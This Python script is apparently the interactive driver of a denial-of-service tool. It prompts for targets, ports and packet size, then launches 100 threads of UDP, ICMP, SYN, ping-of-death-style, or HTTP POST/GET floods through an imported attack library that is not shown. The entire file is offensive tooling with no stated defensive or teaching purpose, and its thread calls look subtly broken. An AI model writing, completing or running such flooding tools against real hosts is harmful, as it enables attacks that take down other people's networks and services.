import requests as res
import threading as th
import time
import sys
import os
from scapy.all import IP, TCP, send, RandShort
import random
import test_lib as ty
import platform
import ping3
from scapy.all import *

choices = [1, 2, 3]
Threads = []

try:
    attack_type = int(input("choose a type of attack: \n volume based attack(1), protocol attack(2), application layer attack(3)\n")) #type of attack
    vector = input("target(targets):\n").split(" ") #target
    bye = input("number of bytes: \n" ).encode() #packet size
    port = input("chose an internet port (or ports) for the attack: (not all types of attack need net port, if your type attack doesn't just press enter)\n").split(" ")#network port(s)
 #  bytes = bytes(bye)
    
    if attack_type == choices[0]:
        volumeBaseAttack = ty.VolumeBasedAttack
        subtype0 = int(input("udp_flooding(1) or ICMP(2)\n"))
        
        if subtype0 == 1:
            print("Now u have 10 second for end the attack... \n")
            time.sleep(10)
            udp_floo = volumeBaseAttack.udp_flooding(bye, vector, port)
            for i in range(100):
                t = th.Thread(target=udp_floo, args=(i,))
                Threads.append(t)
                t.start()
        else:
            print("Now u have 10 second for end the attack... \n")
            time.sleep(10)
            ICMP = volumeBaseAttack.icmp(vector, bye)
            for i in range(100):
                t = th.Thread(target=ICMP, args=(i,))
                Threads.append(t)
                t.start()

    elif attack_type == choices[1]:
        protocolAttack = ty.ProtocolAttack
        subtype1 = int(input("Syn_flood(1) or pof(2)\n"))
        if subtype1 == 1:
            print("Now u have 10 second for end the attack... \n")
            time.sleep(10)
            Syn_flood = protocolAttack.syn_flood(vector, port)
            for i in range(100):
                t = th.Thread(target=Syn_flood, args=(i,))
                Threads.append(t)
                t.start()
        else:
            print("Now u have 10 second for end the attack... \n")
            time.sleep(10)
            pod = protocolAttack.pof(vector, bye)
            for i in range(100):
                t = th.Thread(target=pod, args=(i,))
                Threads.append(t)
                t.start()

    elif attack_type == choices[2]:
        applicationLayerAttack = ty.ApplicationLayerAttack
        subtype2 = int(input("Post(1) or Get(2)\n"))
        if subtype2 == 1:
            print("Now u have 10 second for end the attack... \n")
            time.sleep(10)
            Post = applicationLayerAttack.post(vector, bye)
            for i in range(100):
                t = th.Thread(target=Post, args=(i,))
                Threads.append(t)
                t.start()
                print("using post method to: ", vector)
        else:
            print("Now u have 10 second for end the attack... \n")
            time.sleep(10)
            Get = applicationLayerAttack.get(vector, bye)
            for i in range(100):
                t = th.Thread(target=Get, args=(i,))
                Threads.append(t)
                t.start()

    
    for t in Threads:
        t.join()

except KeyboardInterrupt:
    os.system("cls")
    sys.exit()
